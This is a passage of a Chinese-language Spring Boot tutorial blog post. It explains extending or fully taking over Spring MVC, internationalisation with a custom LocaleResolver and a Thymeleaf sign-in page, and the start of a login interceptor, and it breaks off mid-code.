<code>RequestMappingHandlerAdapter</code> or <code>ExceptionHandlerExceptionResolver</code> you can declare a <code>WebMvcRegistrationsAdapter</code> instance providing such components.</p><p>If you want to take complete control of Spring MVC, you can add your own <code>@Configuration</code> annotated with <code>@EnableWebMvc</code>.</p><h3 id="2、扩展SpringMVC"><a href="#2、扩展SpringMVC" class="headerlink" title="2、扩展SpringMVC"></a>2、扩展SpringMVC</h3><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mvc:view-controller</span> <span class="attr">path</span>=<span class="string">"/hello"</span> <span class="attr">view-name</span>=<span class="string">"success"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:interceptors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mvc:mapping</span> <span class="attr">path</span>=<span class="string">"/hello"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:interceptors</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p><strong>==编写一个配置类（@Configuration），是WebMvcConfigurerAdapter类型；不能标注@EnableWebMvc==</strong>;</p><p>既保留了所有的自动配置，也能用我们扩展的配置；</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用WebMvcConfigurerAdapter可以来扩展SpringMVC的功能</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyMvcConfig</span> <span class="keyword">extends</span> <span class="title class_">WebMvcConfigurerAdapter</span> {</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addViewControllers</span><span class="params">(ViewControllerRegistry registry)</span> {</span><br><span class="line">       <span class="comment">// super.addViewControllers(registry);</span></span><br><span class="line">        <span class="comment">//浏览器发送 /atguigu 请求来到 success</span></span><br><span class="line">        registry.addViewController(<span class="string">"/atguigu"</span>).setViewName(<span class="string">"success"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>原理：</p><p>​    1）、WebMvcAutoConfiguration是SpringMVC的自动配置类</p><p>​    2）、在做其他自动配置时会导入；@Import(<strong>EnableWebMvcConfiguration</strong>.class)</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">   <span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EnableWebMvcConfiguration</span> <span class="keyword">extends</span> <span class="title class_">DelegatingWebMvcConfiguration</span> {</span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">WebMvcConfigurerComposite</span> <span class="variable">configurers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebMvcConfigurerComposite</span>();</span><br><span class="line"></span><br><span class="line"> <span class="comment">//从容器中获取所有的WebMvcConfigurer</span></span><br><span class="line">     <span class="meta">@Autowired(required = false)</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setConfigurers</span><span class="params">(List&lt;WebMvcConfigurer&gt; configurers)</span> {</span><br><span class="line">         <span class="keyword">if</span> (!CollectionUtils.isEmpty(configurers)) {</span><br><span class="line">             <span class="built_in">this</span>.configurers.addWebMvcConfigurers(configurers);</span><br><span class="line">           <span class="comment">//一个参考实现；将所有的WebMvcConfigurer相关配置都来一起调用；  </span></span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">            <span class="comment">// public void addViewControllers(ViewControllerRegistry registry) {</span></span><br><span class="line">             <span class="comment">//    for (WebMvcConfigurer delegate : this.delegates) {</span></span><br><span class="line">              <span class="comment">//       delegate.addViewControllers(registry);</span></span><br><span class="line">              <span class="comment">//   }</span></span><br><span class="line">             }</span><br><span class="line">         }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>​    3）、容器中所有的WebMvcConfigurer都会一起起作用；</p><p>​    4）、我们的配置类也会被调用；</p><p>​    效果：SpringMVC的自动配置和我们的扩展配置都会起作用；</p><h3 id="3、全面接管SpringMVC；"><a href="#3、全面接管SpringMVC；" class="headerlink" title="3、全面接管SpringMVC；"></a>3、全面接管SpringMVC；</h3><p>SpringBoot对SpringMVC的自动配置不需要了，所有都是我们自己配置；所有的SpringMVC的自动配置都失效了</p><p><strong>我们需要在配置类中添加@EnableWebMvc即可；</strong></p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用WebMvcConfigurerAdapter可以来扩展SpringMVC的功能</span></span><br><span class="line"><span class="meta">@EnableWebMvc</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyMvcConfig</span> <span class="keyword">extends</span> <span class="title class_">WebMvcConfigurerAdapter</span> {</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addViewControllers</span><span class="params">(ViewControllerRegistry registry)</span> {</span><br><span class="line">       <span class="comment">// super.addViewControllers(registry);</span></span><br><span class="line">        <span class="comment">//浏览器发送 /atguigu 请求来到 success</span></span><br><span class="line">        registry.addViewController(<span class="string">"/atguigu"</span>).setViewName(<span class="string">"success"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>原理：</p><p>为什么@EnableWebMvc自动配置就失效了；</p><p>1）@EnableWebMvc的核心</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Import(DelegatingWebMvcConfiguration.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> EnableWebMvc {</span><br></pre></td></tr></tbody></table></figure><p>2）、</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DelegatingWebMvcConfiguration</span> <span class="keyword">extends</span> <span class="title class_">WebMvcConfigurationSupport</span> {</span><br></pre></td></tr></tbody></table></figure><p>3）、</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnWebApplication</span></span><br><span class="line"><span class="meta">@ConditionalOnClass({ Servlet.class, DispatcherServlet.class,</span></span><br><span class="line"><span class="meta">WebMvcConfigurerAdapter.class })</span></span><br><span class="line"><span class="comment">//容器中没有这个组件的时候，这个自动配置类才生效</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingBean(WebMvcConfigurationSupport.class)</span></span><br><span class="line"><span class="meta">@AutoConfigureOrder(Ordered.HIGHEST_PRECEDENCE + 10)</span></span><br><span class="line"><span class="meta">@AutoConfigureAfter({ DispatcherServletAutoConfiguration.class,</span></span><br><span class="line"><span class="meta">ValidationAutoConfiguration.class })</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebMvcAutoConfiguration</span> {</span><br></pre></td></tr></tbody></table></figure><p>4）、@EnableWebMvc将WebMvcConfigurationSupport组件导入进来；</p><p>5）、导入的WebMvcConfigurationSupport只是SpringMVC最基本的功能；</p><h2 id="5、如何修改SpringBoot的默认配置"><a href="#5、如何修改SpringBoot的默认配置" class="headerlink" title="5、如何修改SpringBoot的默认配置"></a>5、如何修改SpringBoot的默认配置</h2><p>模式：</p><p>​    1）、SpringBoot在自动配置很多组件的时候，先看容器中有没有用户自己配置的（@Bean、@Component）如果有就用用户配置的，如果没有，才自动配置；如果有些组件可以有多个（ViewResolver）将用户配置的和自己默认的组合起来；</p><p>​    2）、在SpringBoot中会有非常多的xxxConfigurer帮助我们进行扩展配置</p><p>​    3）、在SpringBoot中会有很多的xxxCustomizer帮助我们进行定制配置</p><h2 id="6、RestfulCRUD"><a href="#6、RestfulCRUD" class="headerlink" title="6、RestfulCRUD"></a>6、RestfulCRUD</h2><h3 id="1）、默认访问首页"><a href="#1）、默认访问首页" class="headerlink" title="1）、默认访问首页"></a>1）、默认访问首页</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用WebMvcConfigurerAdapter可以来扩展SpringMVC的功能</span></span><br><span class="line"><span class="comment">//@EnableWebMvc   不要接管SpringMVC</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyMvcConfig</span> <span class="keyword">extends</span> <span class="title class_">WebMvcConfigurerAdapter</span> {</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addViewControllers</span><span class="params">(ViewControllerRegistry registry)</span> {</span><br><span class="line">       <span class="comment">// super.addViewControllers(registry);</span></span><br><span class="line">        <span class="comment">//浏览器发送 /atguigu 请求来到 success</span></span><br><span class="line">        registry.addViewController(<span class="string">"/atguigu"</span>).setViewName(<span class="string">"success"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//所有的WebMvcConfigurerAdapter组件都会一起起作用</span></span><br><span class="line">    <span class="meta">@Bean</span> <span class="comment">//将组件注册在容器</span></span><br><span class="line">    <span class="keyword">public</span> WebMvcConfigurerAdapter <span class="title function_">webMvcConfigurerAdapter</span><span class="params">()</span>{</span><br><span class="line">        <span class="type">WebMvcConfigurerAdapter</span> <span class="variable">adapter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebMvcConfigurerAdapter</span>() {</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addViewControllers</span><span class="params">(ViewControllerRegistry registry)</span> {</span><br><span class="line">                registry.addViewController(<span class="string">"/"</span>).setViewName(<span class="string">"login"</span>);</span><br><span class="line">                registry.addViewController(<span class="string">"/index.html"</span>).setViewName(<span class="string">"login"</span>);</span><br><span class="line">            }</span><br><span class="line">        };</span><br><span class="line">        <span class="keyword">return</span> adapter;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="2）、国际化"><a href="#2）、国际化" class="headerlink" title="2）、国际化"></a>2）、国际化</h3><p><strong>1）、编写国际化配置文件；</strong></p><p>2）、使用ResourceBundleMessageSource管理国际化资源文件</p><p>3）、在页面使用fmt:message取出国际化内容</p><p>步骤：</p><p>1）、编写国际化配置文件，抽取页面需要显示的国际化消息</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59173/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180211130721.png"></p><p>2）、SpringBoot自动配置好了管理国际化资源文件的组件；</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ConfigurationProperties(prefix = "spring.messages")</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MessageSourceAutoConfiguration</span> {</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Comma-separated list of basenames (essentially a fully-qualified classpath</span></span><br><span class="line"><span class="comment"> * location), each following the ResourceBundle convention with relaxed support for</span></span><br><span class="line"><span class="comment"> * slash based locations. If it doesn't contain a package qualifier (such as</span></span><br><span class="line"><span class="comment"> * "org.mypackage"), it will be resolved from the classpath root.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">String</span> <span class="variable">basename</span> <span class="operator">=</span> <span class="string">"messages"</span>;  </span><br><span class="line">    <span class="comment">//我们的配置文件可以直接放在类路径下叫messages.properties；</span></span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> MessageSource <span class="title function_">messageSource</span><span class="params">()</span> {</span><br><span class="line"><span class="type">ResourceBundleMessageSource</span> <span class="variable">messageSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceBundleMessageSource</span>();</span><br><span class="line"><span class="keyword">if</span> (StringUtils.hasText(<span class="built_in">this</span>.basename)) {</span><br><span class="line">            <span class="comment">//设置国际化资源文件的基础名（去掉语言国家代码的）</span></span><br><span class="line">messageSource.setBasenames(StringUtils.commaDelimitedListToStringArray(</span><br><span class="line">StringUtils.trimAllWhitespace(<span class="built_in">this</span>.basename)));</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.encoding != <span class="literal">null</span>) {</span><br><span class="line">messageSource.setDefaultEncoding(<span class="built_in">this</span>.encoding.name());</span><br><span class="line">}</span><br><span class="line">messageSource.setFallbackToSystemLocale(<span class="built_in">this</span>.fallbackToSystemLocale);</span><br><span class="line">messageSource.setCacheSeconds(<span class="built_in">this</span>.cacheSeconds);</span><br><span class="line">messageSource.setAlwaysUseMessageFormat(<span class="built_in">this</span>.alwaysUseMessageFormat);</span><br><span class="line"><span class="keyword">return</span> messageSource;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>3）、去页面获取国际化的值；</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59173/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180211134506.png"></p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>  <span class="attr">xmlns:th</span>=<span class="string">"http://www.thymeleaf.org"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"description"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"author"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Signin Template for Bootstrap<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Bootstrap core CSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"asserts/css/bootstrap.min.css"</span> <span class="attr">th:href</span>=<span class="string">"@{/webjars/bootstrap/4.0.0/css/bootstrap.css}"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Custom styles for this template --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"asserts/css/signin.css"</span> <span class="attr">th:href</span>=<span class="string">"@{/asserts/css/signin.css}"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"form-signin"</span> <span class="attr">action</span>=<span class="string">"dashboard.html"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">"mb-4"</span> <span class="attr">th:src</span>=<span class="string">"@{/asserts/img/bootstrap-solid.svg}"</span> <span class="attr">src</span>=<span class="string">"asserts/img/bootstrap-solid.svg"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">width</span>=<span class="string">"72"</span> <span class="attr">height</span>=<span class="string">"72"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"h3 mb-3 font-weight-normal"</span> <span class="attr">th:text</span>=<span class="string">"#{login.tip}"</span>&gt;</span>Please sign in<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"sr-only"</span> <span class="attr">th:text</span>=<span class="string">"#{login.username}"</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"Username"</span> <span class="attr">th:placeholder</span>=<span class="string">"#{login.username}"</span> <span class="attr">required</span>=<span class="string">""</span> <span class="attr">autofocus</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"sr-only"</span> <span class="attr">th:text</span>=<span class="string">"#{login.password}"</span>&gt;</span>Password<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"Password"</span> <span class="attr">th:placeholder</span>=<span class="string">"#{login.password}"</span> <span class="attr">required</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"checkbox mb-3"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">value</span>=<span class="string">"remember-me"</span>/&gt;</span> [[#{login.remember}]]</span><br><span class="line">        <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-lg btn-primary btn-block"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">th:text</span>=<span class="string">"#{login.btn}"</span>&gt;</span>Sign in<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"mt-5 mb-3 text-muted"</span>&gt;</span>© 2017-2018<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"btn btn-sm"</span>&gt;</span>中文<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"btn btn-sm"</span>&gt;</span>English<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>效果：根据浏览器语言设置的信息切换了国际化；</p><p>原理：</p><p>​    国际化Locale（区域信息对象）；LocaleResolver（获取区域信息对象）；</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingBean</span></span><br><span class="line"><span class="meta">@ConditionalOnProperty(prefix = "spring.mvc", name = "locale")</span></span><br><span class="line"><span class="keyword">public</span> LocaleResolver <span class="title function_">localeResolver</span><span class="params">()</span> {</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.mvcProperties</span><br><span class="line">.getLocaleResolver() == WebMvcProperties.LocaleResolver.FIXED) {</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">FixedLocaleResolver</span>(<span class="built_in">this</span>.mvcProperties.getLocale());</span><br><span class="line">}</span><br><span class="line"><span class="type">AcceptHeaderLocaleResolver</span> <span class="variable">localeResolver</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AcceptHeaderLocaleResolver</span>();</span><br><span class="line">localeResolver.setDefaultLocale(<span class="built_in">this</span>.mvcProperties.getLocale());</span><br><span class="line"><span class="keyword">return</span> localeResolver;</span><br><span class="line">}</span><br><span class="line">默认的就是根据请求头带来的区域信息获取Locale进行国际化</span><br></pre></td></tr></tbody></table></figure><p>4）、点击链接切换国际化</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 可以在连接上携带区域信息</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyLocaleResolver</span> <span class="keyword">implements</span> <span class="title class_">LocaleResolver</span> {</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Locale <span class="title function_">resolveLocale</span><span class="params">(HttpServletRequest request)</span> {</span><br><span class="line">        <span class="type">String</span> <span class="variable">l</span> <span class="operator">=</span> request.getParameter(<span class="string">"l"</span>);</span><br><span class="line">        <span class="type">Locale</span> <span class="variable">locale</span> <span class="operator">=</span> Locale.getDefault();</span><br><span class="line">        <span class="keyword">if</span>(!StringUtils.isEmpty(l)){</span><br><span class="line">            String[] split = l.split(<span class="string">"_"</span>);</span><br><span class="line">            locale = <span class="keyword">new</span> <span class="title class_">Locale</span>(split[<span class="number">0</span>],split[<span class="number">1</span>]);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> locale;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLocale</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Locale locale)</span> {</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> LocaleResolver <span class="title function_">localeResolver</span><span class="params">()</span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MyLocaleResolver</span>();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="3）、登陆"><a href="#3）、登陆" class="headerlink" title="3）、登陆"></a>3）、登陆</h3><p>开发期间模板引擎页面修改以后，要实时生效</p><p>1）、禁用模板引擎的缓存</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 禁用缓存</span><br><span class="line">spring.thymeleaf.cache=false </span><br></pre></td></tr></tbody></table></figure><p>2）、页面修改完成以后ctrl+f9：重新编译；</p><p>登陆错误消息的显示</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"color: red"</span> <span class="attr">th:text</span>=<span class="string">"${msg}"</span> <span class="attr">th:if</span>=<span class="string">"${not #strings.isEmpty(msg)}"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h3 id="4）、拦截器进行登陆检查"><a href="#4）、拦截器进行登陆检查" class="headerlink" title="4）、拦截器进行登陆检查"></a>4）、拦截器进行登陆检查</h3><p>拦截器</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 